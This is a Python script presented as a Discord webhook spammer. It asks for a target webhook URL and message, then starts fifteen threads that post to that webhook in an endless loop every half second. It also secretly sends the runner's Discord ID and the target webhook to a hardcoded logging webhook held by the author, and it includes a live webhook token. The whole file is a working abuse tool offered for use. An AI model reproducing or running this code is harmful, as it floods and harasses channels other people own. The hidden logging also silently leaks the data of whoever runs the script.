import requests
import threading
import time
import re

# ASCII Art Banner for "Almighty Leaks"
ascii_banner = r"""
     _    _      _ _       _       _             
    / \  | |    | | |     | |     | |            
   / _ \ | |    | | |     | |     | |            
  / ___ \| |___ | | | ___ | | ___ | | ___         
 /_/   \_\_____|_|_| \___|_|_| \___|_|/___|       
                                                  
"""

# Main Menu Banner (can be replaced with any ASCII art/image)
menu_image = r"""
*************************************************
*                                               *
*           WELCOME TO THE SPAMMER               *
*             (MADE BY KENZIE)                   *
*               discord.gg/ALMIGHTYLEAKS        *
*                                               *
*************************************************
"""

# Log Webhook URL (replace with your actual log channel webhook URL)
LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1440350168359633107/Kfi5zjJB2Qi8AJPK50x4EsjPxrU1EPRkF3w43KyzGxejle0HyEVeZjrO-p4bnkALs9LO"

def is_valid_discord_id(user_id):
    return re.match(r"^\d{17,19}$", user_id) is not None

def is_valid_webhook_url(url):
    pattern = r"^https:\/\/(canary\.)?discord(app)?\.com\/api\/webhooks\/\d+\/[\w-]+$"
    return re.match(pattern, url) is not None

def send_log(spammer_id, used_webhook, avatar_url, message):
    user_mention = f"<@{spammer_id}>"
    log_content = (
        f"🔴 **Spam Attempt Logged**\n"
        f"Spammer: {user_mention}\n"
        f"Webhook Used: {used_webhook}\n"
        f"Avatar URL: {avatar_url}\n"
        f"Message: {message}\n"
        f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )
    try:
        response = requests.post(LOG_WEBHOOK_URL, json={"content": log_content})
        if response.status_code not in [200, 204]:
            print("Failed to send log to Discord.")
    except requests.exceptions.RequestException:
        print("Error sending log to Discord.")

def spam_webhook(webhook, message, username, avatar_url):
    session = requests.Session()
    while True:
        try:
            session.post(webhook, json={
                "content": message,
                "username": username,
                "avatar_url": avatar_url
            })
        except requests.exceptions.RequestException:
            pass
        time.sleep(0.5)

def start_spammer():
    print(ascii_banner)
    print(menu_image)  # Display the "image" at the start of the menu

    # Prompt for Webhook URL
    while True:
        webhook = input("[\033[95m>\033[37m] Webhook URL: ").strip()
        if is_valid_webhook_url(webhook):
            break
        else:
            print("\033[91mInvalid Webhook URL. Please enter a valid Discord webhook URL.\033[0m")

    # Prompt for Message
    message = input("[\033[94m>\033[37m] Message: ").strip()

    # Prompt for Webhook Username
    username = input("[\033[95m>\033[37m] Webhook Username?: ").strip()
    if not username:
        username = "Spammer"

    # Prompt for Avatar URL (optional)
    avatar_url = input("[\033[95m>\033m] Avatar Image URL? (leave blank if none): ").strip()

    # Prompt for Spammer User ID
    while True:
        spammer_id = input("[\033[95m>\033[37m] Your Discord User ID: ").strip()
        if is_valid_discord_id(spammer_id):
            break
        else:
            print("\033[91mInvalid Discord ID. Please enter a numeric User ID (17-19 digits).\033[0m")

    # Send initial log
    send_log(spammer_id, webhook, avatar_url, message)

    # Start spam threads
    for _ in range(15):
        threading.Thread(target=spam_webhook, args=(webhook, message, username, avatar_url), daemon=True).start()

    print("\n\033[92m[+] Webhook spammer started!\033[0m\n")
    while True:
        time.sleep(1)

# Run the spammer
start_spammer()
